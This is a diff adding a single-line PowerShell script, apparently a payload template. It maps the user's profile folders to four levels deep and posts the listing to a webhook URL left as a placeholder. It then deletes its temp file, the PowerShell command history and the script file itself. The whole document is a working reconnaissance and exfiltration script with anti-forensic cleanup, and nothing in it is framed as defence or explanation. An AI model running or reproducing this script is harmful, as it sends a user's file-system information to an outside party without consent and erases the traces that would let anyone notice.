@@ -1,0 +1,1 @@
+$s=[Environment]::GetFolderPath('UserProfile');$f=[IO.Path]::GetTempFileName();function t($p,$i='',$n=0){if($n-ge4){return};gci $p -dir|%{"$i|--$($_.Name)"|ac $f;t $_.FullName "$i " ($n+1)}};$s|ac $f;t $s;iwr '<Your WebHook URL goes here>' -Method Post -Body (gc $f -Raw) -ContentType 'text/plain';rm $f;rm (Get-PSReadLineOption).HistorySavePath -Force;rm f.ps1;exit
